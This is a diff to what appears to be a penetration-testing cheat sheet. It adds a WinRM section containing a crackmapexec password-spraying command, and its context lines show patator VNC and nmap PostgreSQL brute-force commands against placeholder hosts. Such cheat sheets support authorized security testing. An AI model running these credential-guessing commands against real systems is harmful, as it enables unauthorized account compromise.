@@ -330,6 +330,12 @@ patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x
 nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
 ```
 
+### Winrm
+
+```bash
+crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
+```
+
 ## Local
 
 ### Online cracking databases
